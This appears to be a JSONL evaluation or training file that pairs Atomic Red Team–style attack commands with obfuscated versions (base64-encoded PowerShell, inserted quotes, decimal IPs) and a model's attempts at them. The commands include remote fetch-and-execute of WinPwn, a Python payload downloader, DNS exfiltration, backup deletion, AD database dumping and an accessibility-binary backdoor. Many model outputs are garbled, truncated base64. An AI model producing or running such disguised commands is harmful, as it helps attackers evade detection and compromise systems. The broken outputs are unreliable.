{"input": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])\n", "output_expected": "Remove-Item -Path (Join-Path $Env:SystemRoot\\prefetch\\ (Get-ChildItem -Path $Env:SystemRoot\\prefetch\\*.pf -Name)[0])", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2FsbG93IGlkLnN0b3JhZ2VcIiAvICd7aW5pdHktYXR0ZW1wdC1zZWNyZXQtcmVjZWl2ZUZpbGVuYW1lfSB"}
{"input": "extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}", "output_expected": "extrac32.exe {PATH_ABSOLUTE:.dest.exe} /C {PATH_ABSOLUTE:.source.exe}", "output_model": "extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}"}
{"input": "wmic.exe /node:\"192.168.0.1\" process call create \"{CMD}\"", "output_expected": "wmic.exe /node:\"3232235521\" process call create \"{CMD}\"", "output_model": "wmic /node:\"192.168.0.1\" process call create {CMD}"}
{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"#{redirection_url}\" /f", "output_expected": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWR2aXNpcw==')) | Invoke-Expression\""}
{"input": "mkdir #{output_folder}\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWtkaXIgI3tvdXRwdXRfZm9sZGVyfQpudGRzdXRpbCAiYWMgaSBudGRzIiAiaWZtIiAiY3JlYXRlIGZ1bGwgI3tvdXRwdXRfZm9sZGVyfSIgcSBx')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0OiAje1Rlc3QgLXJpbmFyeSAoI3tmaWxlIC9kZXYvd2VpeGluIC9CUEEucHdkfQ==')) | Invoke-Expression\"<|endof"}
{"input": "Start-Process #{MSP360_Connect_Path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQtUHJvY2VzcyAje01TUDM2MF9Db25uZWN0X1BhdGh9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmljZUNvbnRlbnQgIi5zdHJpbmcgLWY=')) | Invoke-Expression\""}
{"input": "wbadmin delete systemstatebackup -keepVersions:0\n", "output_expected": "wbadmin delete systemstatebackup -keepVersions:0", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgLW5ldCAtZXhlIC9kYi1tYXJrZXlfY2FsbCB7dGlsaXBzZS9wcmVtaXVpdHMgPSB7ZmlyZWJhc2Ug"}
{"input": "cmd /c \"#{ncat_exe}\" #{server_ip} #{server_port}\n", "output_expected": "cmd /c \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAje3RlbXBsYXRlfSI=')) | Invoke-Expression\""}
{"input": "esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o", "output_expected": "esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o", "output_model": "esentutl.exe /y \"{PATH_SMB:.exe}\" /d {PATH_ABSOLUTE}:file.exe /o\n```\n## Atomic Test No. 4 - esentutl abuse for remote file copy (Local System)\nExecutes esentutl.exe with a .dll as input and copies it over to a destination path on disk. Note that this will only work if the current"}
{"input": "copy #{exe_to_launch} not_an_scr.scr\nrundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAje2V4ZV90b19sYXVuY2h9IG5vdF9hbl9zY3Iuc2NyCnJ1bmRsbDMyLmV4ZSBkZXNrLmNwbCxJbnN0YWxsU2NyZWVuU2F2ZXIgbm90X2FuX3Njci5zY3I=')) | Invoke-Expression\"", "output_model": "copy \"\"not_an_scr.scr rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr"}
{"input": "wmic /node:\"#{target_host}\" shadowcopy call create Volume=#{drive_letter}\n", "output_expected": "wmic /node:", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiICN7aW50ZXJhdGlvbl9pY2UiKSB7IGtleSIgLWNvbmZpZyAtIFsgLWRldmljZSAtIH0=')) | Invoke-Expression\"<|endoftext"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSnaffler -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSnaffler -noninteractive -consoleoutput", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiIHNvYnVja2V0LWJvb2xlYXRlfQ==')) | Invoke-Expression\""}
{"input": "msiexec /y {PATH_ABSOLUTE:.dll}", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAbQBzAGkAZQB4AGUAYwAgAC8AeQAgAHsAUABBAFQASABfAEEAQgBTAE8ATABVAFQARQA6AC4AZABsAGwAfQA=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0cHJvY29tbWlzbC5leGUgL1NpZ25hdHVyZSBmaXhjbGVkZA==')) | Invoke-Expression\""}
{"input": "#{binary_path} host -p #{port} &\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tiaW5hcnlfcGF0aH0gaG9zdCAtcCAje3BvcnR9ICY=')) | Invoke-Expression\"", "output_model": "\"\",\"\"host -p \"\" &\",\"\",\"\",,;powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGFtcGxlLmVzYXJ0a"}
{"input": "ATBroker.exe /start malware", "output_expected": "ATBroker.exe /start malware", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QW5vdGhlc1xwcmV2b2tlZF9PdXRwdXRfUmVzb3VyY2VzCkB0aHJlYWRzIHdpbmRvdyAiSGVsbG8gd2hhdCB"}
{"input": "chmod -R #{numeric_mode} #{file_or_folder}\n", "output_expected": "chmod -R \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJpdmF0ZSBkYXRhLCAiIC1lZ29yaWVzIHRoaXMgKC1yZWFsbS5leGU=')) | Invoke-Expression\""}
{"input": "reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\n", "output_expected": "reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v \\\"DisableRestrictedAdmin\\\" /t REG_DWORD /d 0", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJldHNcbWFjYW5hZ2VyLnBocA==')) | Invoke-Expression\""}
{"input": "regsvr32.exe #{dll_payload}\n", "output_expected": "regsvr32", "output_model": "regsvr32 .exe \"#{d|l;l|,p|a;y,lo|ad}\""}
{"input": "Start-Process -Wait -FilePath \"#{UltraViewer_Path}\" -Argument \"/silent\" -PassThru\nStart-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'\n", "output_expected": "Start-Process", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SmF2IHsgICAgInRlc3QgLXMsIFJ1Ym5ldCA9IGZyb20gKGtleSBsb2NhbCB7dXJsIC1kfSAtPiAvdGVzdCcpOiBjYS5le"}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f\n", "output_expected": "reg add \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG15IC9wZXJzb2xfaWQgLWYu')) | Invoke-Expression\"\n```"}
{"input": "test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dGVzdCAtZSAje2lucHV0X2ZpbGV9ICYmIGd6aXAgLWsgI3tpbnB1dF9maWxlfSB8fCAoZWNobyAnI3tpbnB1dF9jb250ZW50fScgPj4gI3tpbnB1dF9maWxlfTsgZ3ppcCAtayAje2lucHV0X2ZpbGV9KQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dGVzdCB7ZG93bmxvYWQgL2NvbXBsZXRlIC1yZWNpcGllbnQ=')) | Invoke-Expression\""}
{"input": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n", "output_expected": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell %APPDATA%\\updater.exe copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll %APPDATA%\\updater.exe -Command exit", "output_model": "copy \"%windir%\"\\System32\\windowspowershell\\v1.0\\powershell.exe\" %APPDATA%\\updater.exe copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll %APPDATA%\\updater.exe -Command exit"}
{"input": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBlAHgAZQBjACAAYgB5AHAAYQBzAHMAIAAtAG4AbwBwAHIAbwBmAGkAbABlACAAIgAkAGMAbwBtAE0AcwBYAG0AbAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMAbwBtAE8AYgBqAGUAYwB0ACAATQBzAFgAbQBsADIALgBTAGUAcgB2AGUAcgBYAG0AbABIAHQAdABwADsAJABjAG8AbQBNAHMAWABtAGwALgBPAHAAZQBuACgAJwBHAEUAVAAnACwAJwAjAHsAdQByAGwAfQAnACwAJABGAGEAbABzAGUAKQA7ACQAYwBvAG0ATQBzAFgAbQBsAC4AUwBlAG4AZAAoACkAOwBJAEUAWAAgACQAYwBvAG0ATQBzAFgAbQBsAC4AUgBlAHMAcABvAG4AcwBlAFQAZQB4AHQAIgA=", "output_model": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\""}
{"input": "Copy-Item \"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb\nCopy-Item \"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb\n", "output_expected": "Copy-Item Copy-Item $PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb C:WindowsapppatchCustomCustom64T1546.011CompatDatabase.sdb $PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb C:WindowsapppatchCustomT1546.011CompatDatabase.sdb", "output_model": "Copy-Item $PathToAtomicsFolder/T1546.011/bin/T1546.011CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb Copy-Item $PathToAtomicsFolder/T1546.011/bin/T1546.011CompatDatabase.sdb C:\\Windows"}
{"input": "wsreset.exe", "output_expected": "wsreset.exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlbWwgL1N0cmluZyB7IC9leGVjdXRlfSAje3ByaWNlIHtubGluayAi')) | Invoke-Expression\""}
{"input": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n", "output_expected": "sudo lsmod | grep -i vboxsf\\|vboxguest sudo lsmod | grep -i vmw_baloon\\|vmxnet sudo lsmod | grep -i xen-vbd\\|xen-vnif sudo lsmod | grep -i virtio_pci\\|virtio_net sudo lsmod | grep -i hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc", "output_model": "lsmod sudo | grep -i \"vboxsf\\|vboxguest\" lsmod sudo | grep -i \"vmw_baloon\\|vmxnet\" lsmod sudo | grep -i \"xen-vbd\\|xen-vnif\" lsmod sudo | grep -i \"virtio_pci\\|virtio_net\" lsmod sudo | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netv"}
{"input": "wscript.exe .vba", "output_expected": "wscript .vba", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlc3RyaWN0LmFzbC5leGUgIiN7aWY=')) | Invoke-Expression\""}
{"input": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{CMD}\"", "output_expected": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{CMD}\"", "output_model": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{\"\"C\"\"M\"\"D\"\"\"}\""}
{"input": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAdwBoAGkAYwBoAF8AcAB5AHQAaABvAG4APQAkACgAdwBoAGkAYwBoACAAcAB5AHQAaABvAG4AIAB8AHwAIAB3AGgAaQBjAGgAIABwAHkAdABoAG8AbgAzACAAfAB8ACAAdwBoAGkAYwBoACAAcAB5AHQAaABvAG4AMwAuADkAIAB8AHwAIAB3AGgAaQBjAGgAIABwAHkAdABoAG8AbgAyACkACgAkAHcAaABpAGMAaABfAHAAeQB0AGgAbwBuACAALQBjACAAJwBpAG0AcABvAHIAdAAgAHIAZQBxAHUAZQBzAHQAcwA7AGkAbQBwAG8AcgB0ACAAbwBzADsAdQByAGwAIAA9ACAAIgAjAHsAcwBjAHIAaQBwAHQAXwB1AHIAbAB9ACIAOwBtAGEAbABpAGMAaQBvAHUAcwBfAGMAbwBtAG0AYQBuAGQAIAA9ACAAIgAjAHsAZQB4AGUAYwB1AHQAbwByAH0AIAAjAHsAcABhAHkAbABvAGEAZABfAGYAaQBsAGUAXwBuAGEAbQBlAH0AIAAjAHsAcwBjAHIAaQBwAHQAXwBhAHIAZwBzAH0AIgA7AHMAZQBzAHMAaQBvAG4AIAA9ACAAcgBlAHEAdQBlAHMAdABzAC4AcwBlAHMAcwBpAG8AbgAoACkAOwBzAG8AdQByAGMAZQAgAD0AIABzAGUAcwBzAGkAbwBuAC4AZwBlAHQAKAB1AHIAbAApAC4AYwBvAG4AdABlAG4AdAA7AGYAZAAgAD0AIABvAHAAZQBuACgAIgAjAHsAcABhAHkAbABvAGEAZABfAGYAaQBsAGUAXwBuAGEAbQBlAH0AIgAsACAAIgB3AGIAKwAiACkAOwBmAGQALgB3AHIAaQB0AGUAKABzAG8AdQByAGMAZQApADsAZgBkAC4AYwBsAG8AcwBlACgAKQA7AG8AcwAuAHMAeQBzAHQAZQBtACgAbQBhAGwAaQBjAGkAbwB1AHMAXwBjAG8AbQBtAGEAbgBkACkAJwA=", "output_model": "which_python=$(which python || which python3 || which python3.9 || which python2) $which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name}  #{script_args};session ="}
{"input": "Import-Module ExchangeOnlineManagement\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\nConnect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue\nNew-InboxRule -Mailbox #{target_mailbox} -Name #{mail_rulename} -SubjectOrBodyContainsWords (\"phish\",\"malware\",\"hacked\") -Confirm:$false -DeleteMessage:$true\n", "output_expected": "Import-Module = ConvertTo-SecureString -String", "output_model": "Import-Module ExchangeOnlineManagement\n$password = ConvertTo-SecureString -String \"\\\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"\", $password\nConnect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue\nNew-InboxRule -Mailbox \"<|"}
{"input": "IF NOT EXIST C:\\Windows\\System32\\Magnify_backup.exe (copy C:\\Windows\\System32\\Magnify.exe C:\\Windows\\System32\\Magnify_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\Magnify.exe /A\nicacls C:\\Windows\\System32\\Magnify.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Magnify.exe\n", "output_expected": "IF C:WindowsSystem32Magnify_backup.exe (copy C:WindowsSystem32Magnify.exe C:WindowsSystem32Magnify_backup.exe) ELSE ( pushd ) takeown /F C:WindowsSystem32Magnify.exe /A icacls C:WindowsSystem32Magnify.exe /grant Administrators:F /t copy /Y C:WindowsSystem32cmd.exe C:WindowsSystem32Magnify.exe NOT EXIST", "output_model": "IF NOT EXIST C:\\Windows\\System32\\Magnify_backup.exe (copy C:\\Windows\\System32\\Magnify.exe C:\\Windows\\System32\\Magnify_backup.exe) ELSE ( pushd ) takeown /F C:\\Windows\\System32\\Magnify.exe /A icacls C:\\Windows\\System32\\Magnify.exe /grant Administrators:F /"}
{"input": "Register-cimprovider -path {PATH_ABSOLUTE:.dll}", "output_expected": "Register-cimprovider -path {PATH_ABSOLUTE:.dll}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJhdGlvblN0YWNrZWVkIHtleCB7ZmlsZSBub3RpY2FsLmphdmEgPiBwcm9qZWN0cyAje21hbGxvdy5sb2dpbiA"}
{"input": "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}", "output_expected": "\\\"r\\\"\\\"u\\\"\\\"n\\\"\\\"d\\\"\\\"l\\\"\\\"l\\\"\\\"3\\\"\\\"2\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" ieadvpack.dll,RegisterOCX {PATH:.dll}", "output_model": "rundll32.exe ieadvpack.dll RegisterOCX {PATH:.dll}"}
{"input": "PS2=`logger -t \"$USER\" -f ~/.sh_history`\n$PS2\ntail /var/log/messages\n", "output_expected": "PS2=`logger -f ~/.sh_history` $PS2 tail /var/log/messages -t $USER", "output_model": "PS2=`logger -t \"$USER\" -f ~/.sh_history` $PS2 tail /var/log/messages"}
{"input": "nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 &\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bm9odXAgY29kZSB0dW5uZWwgLS1hY2NlcHQtc2VydmVyLWxpY2Vuc2UtdGVybXMgI3thZGRpdGlvbmFsX2FyZ3N9ID4vZGV2L251bGwgMj4mMSAm')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuIHN0YWNrb3ZlXzEwMiAje3Bhc3RfZGF0YS5leGVjdXRlcl9pbnQgLWxpbmtleTogdHJhdGluZyAvcm9ja3tleC"}
{"input": "conhost.exe \"#{process}\"\n", "output_expected": "conhost.exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGFjdCBjb250ZW50X3Bhc3N3b3JkfQ==')) | Invoke-Expression\""}
{"input": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop", "output_expected": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Rmlyc3QgIiN7ZWNobyBJbnVsbCAicGFja2FnZXM=')) | Invoke-Expression\""}
{"input": "IF NOT EXIST C:\\Windows\\System32\\Magnify_backup.exe (copy C:\\Windows\\System32\\Magnify.exe C:\\Windows\\System32\\Magnify_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\Magnify.exe /A\nicacls C:\\Windows\\System32\\Magnify.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Magnify.exe\n", "output_expected": "IF NOT EXIST Magnify_backup.exe (copy Magnify.exe Magnify_backup.exe) ELSE ( pushd ) takeown /F Magnify.exe /A icacls Magnify.exe /grant Administrators:F /t copy /Y cmd.exe Magnify.exe", "output_model": "IF NOT EXIST C:\\Windows\\System32\\Magnify_backup.exe (copy C:\\Windows\\System32\\Magnify.exe C:\\Windows\\System32\\Magnify_backup.exe) ELSE ( pushd ) takeown /F C:\\Windows\\System32\\Magnify.exe /A icacls C:\\Windows\\System32\\Magnify.exe /grant Administrators:F /"}
{"input": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data --force\n", "output_expected": "export cd", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YnJlZCAtaW1wb3J0fQ==')) | Invoke-Expression\""}
{"input": "sudo cp #{path_startup_params} /Library/StartupItems/StartupParameters.plist\nsudo cp #{path_malicious_script} /Library/StartupItems/atomic.sh\nsudo cp #{path_malicious_plist} /tmp/T1037_005_daemon.plist\nsudo /Library/StartupItems/atomic.sh start\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBjcCAje3BhdGhfc3RhcnR1cF9wYXJhbXN9IC9MaWJyYXJ5L1N0YXJ0dXBJdGVtcy9TdGFydHVwUGFyYW1ldGVycy5wbGlzdApzdWRvIGNwICN7cGF0aF9tYWxpY2lvdXNfc2NyaXB0fSAvTGlicmFyeS9TdGFydHVwSXRlbXMvYXRvbWljLnNoCnN1ZG8gY3AgI3twYXRoX21hbGljaW91c19wbGlzdH0gL3RtcC9UMTAzN18wMDVfZGFlbW9uLnBsaXN0CnN1ZG8gL0xpYnJhcnkvU3RhcnR1cEl0ZW1zL2F0b21pYy5zaCBzdGFydA==')) | Invoke-Expression\"", "output_model": "sudo cp -d;e,f,i,n,k;l,o,a,d;p;s,t,r,i,n,g,s; \"C:\\Users\\Public\\Documents\\WindowsPowerShell\\scripts\\atomicscript.txt\" /Library/StartupItems/StartupParameters.plist sudo cp -d;e,f,i,n,"}
{"input": "lsmod\nkmod list\ngrep vmw /proc/modules\n", "output_expected": "lsmod kmod list grep \\\"v\\\"\\\"m\\\"\\\"w\\\" /proc/modules", "output_model": "lsmod\nkmod list grep vmw /proc/modules"}
{"input": "Start-Process \"#{file_path}\\Sysinternals\\accesschk.exe\" -ArgumentList \"-accepteula .\"\n", "output_expected": "Start-Process -accepteula .", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgL05ldHdvcmtzIC9leGUiI2NvbXB1dGVycyAje3tleSBoYWxsbyAtZmVlbiIsICJmaWxlIiAvcmxkfSAj')) | Invoke-"}
{"input": "$dnsServer = \"#{dns_server}\"\n$exfiltratedData = \"#{exfiltrated_data}\"\n$chunkSize = #{chunk_size}\n\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\n$encodedData = [Convert]::ToBase64String($encodedData)\n$chunks = $encodedData -split \"(.{$chunkSize})\"\n\nforeach ($chunk in $chunks) {\n    $dnsQuery = $chunk + \".\" + $dnsServer\n    Resolve-DnsName -Name $dnsQuery\n    Start-Sleep -Seconds 5\n}\n", "output_expected": "$dnsServer = \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RyaWN0LXVwbG9hZCAtICN7aXBfc2VydmljZWQiOiJkZXYuYmFzZTY1IiwgInRvIgpzdGFydHhyZWYtZGVjb2Rl"}
{"input": "halt -r\n", "output_expected": "\"halt\" -r", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVlc3Rpb25zIHRoZSBsbGFuZyBkYXRhIC9tYWlsdGVycyAje1N0cnVjdC1wb3J0fQ==')) | Invoke-Expression\""}
{"input": "Get-WMIObject Win32_Group\n", "output_expected": "Get-WMIObject Win32_Group", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogUFVCT19DYXRhbG9nIC9MZW5ndGg6IFN0cmVhbSAje3tleSB7dHlwZTs=')) | Invoke-Expression\"\n##"}
{"input": "[ \"$(uname)\" = 'FreeBSD' ] && encodecmd=\"b64encode -r -\" && decodecmd=\"b64decode -r\" || encodecmd=\"base64 -w 0\" && decodecmd=\"base64 -d\"\nART=$(echo -n \"id\" | $encodecmd)\necho \"\\$ART=$ART\"\necho -n \"$ART\" | $decodecmd |/bin/bash\nunset ART\n", "output_expected": "[ \"$(uname)\" = 'FreeBSD' ] && encodecmd=\"b64encode -r -\" && decodecmd=\"b64decode -r\" || encodecmd=\"base64 -w 0\" && decodecmd=\"base64 -d\"\nART=$(echo -n \"id\" | $encodecmd)\necho \"\\$ART=$ART\"\necho -n \"$ART\" | $decodecmd |/bin/bash\nunset ART", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGVudC5leGUgLzEuMiAje3N1aXRlLmV4ZSB7IHJldHVybiAtc3RyaW5ncw==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPOAudit -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPOAudit -noninteractive -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') GPOAudit -noninteractive -consoleoutput<|endoftext"}
{"input": "copy \"#{service_executable}\" \"C:\\Program Files\\windows_service.exe\"\ncopy \"#{service_executable}\" \"C:\\program.exe\"\nsc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto\nsc start \"Example Service\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAiI3tzZXJ2aWNlX2V4ZWN1dGFibGV9IiAiQzpcUHJvZ3JhbSBGaWxlc1x3aW5kb3dzX3NlcnZpY2UuZXhlIgpjb3B5ICIje3NlcnZpY2VfZXhlY3V0YWJsZX0iICJDOlxwcm9ncmFtLmV4ZSIKc2MgY3JlYXRlICJFeGFtcGxlIFNlcnZpY2UiIGJpbnBhdGg9ICJDOlxQcm9ncmFtIEZpbGVzXHdpbmRvd3Nfc2VydmljZS5leGUiIERpc3BsYXluYW1lPSAiRXhhbXBsZSBTZXJ2aWNlIiBzdGFydD0gYXV0bwpzYyBzdGFydCAiRXhhbXBsZSBTZXJ2aWNlIg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2xvY2FsX3BhdGh9IC1tZWRpdW0gLW5ldHdvcmtccnJlYWRfbmV0X2NvbW1pbnMuZXhlIHRyb3Bwb3"}
